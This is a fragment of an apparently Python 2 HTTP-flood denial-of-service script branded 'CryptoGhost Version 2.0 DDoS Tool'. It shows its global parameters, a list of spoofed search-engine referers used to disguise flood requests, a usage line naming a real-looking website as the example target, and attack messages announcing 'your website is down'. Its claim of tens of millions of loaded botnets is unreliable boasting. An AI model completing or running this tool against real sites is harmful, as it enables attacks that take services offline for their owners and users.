...
#global params                                                                                       
url=''                                                                                              ################################
host=''                                                                                             #~~~~~~Created By Da Dan~~~~~~~#
headers_useragents=[]                                                                               #~~~~~~~~~~@FollowMe~~~~~~~~~~~#
headers_referers=[]                                                                                 #gmail:dadannurzaman32@gmail.om#
request_counter=0                                                                                   #~~~youtube.com/dadannrzmn~~~~~#
flag=0                                                                                              #~~~~~~~~IG:@dadannrzmn#~~~~~~~#
safe=0                                                                                              ################################
...
def referer_list():
	...
	headers_referers.append('http://engadget.search.aol.com/search?q=')                        #All uploaded by CyptoGhost#
	headers_referers.append('http://www.bing.com/search?q=')                                   #From Crypton Ghost Team   #
...
def usage():
	print 'CryptoGhost Version 2.0 DDoS Tool Created By Da Dan '
	print 'http://facebook.com/maafakundihelbydadan'
	print 'New loaded Botnets: 39,445,657'
	print 'Usage: Saddam (url)'
	print 'Example: Saddam.py http://luthi.co.il/'
	print "\a"	
print \
""" 
  ____                  _         ____ _               _    
  / ___|_ __ _   _ _ __ | |_ ___  / ___| |__   ___  ___| |_  
 | |   | '__| | | | '_ \| __/ _ \| |  _| '_ \ / _ \/ __| __| 
 | |___| |  | |_| | |_) | || (_) | |_| | | | | (_) \__ \ |_  
  \____|_|   \__, | .__/ \__\___/ \____|_| |_|\___/|___/\__| 
             |___/|_|                                        
...
def httpcall(url):
	...
	try:
			...
			set_flag(1)
 			print '                                                                    '
 			print '#~~~~~~~> We Are CryptoGhost <~~~~~~~~#~~~>Welcome for the dadan<~~~~~~#'
 			print '#~~~~~~> Belong your database <~~~~~~~#~~~~~~~~~>Hello admin<~~~~~~~~~~#'
 			print '#~~~~~~> Fuck your Firewall <~~~~~~~~~#~~~~>your website is down<~~~~~~#'
 			print '#~~~> Your website will be down <~~~#~~~~~>By CryptoGhost Mass DDoS<~~~#'
 			print '                                                                    '
			code=500
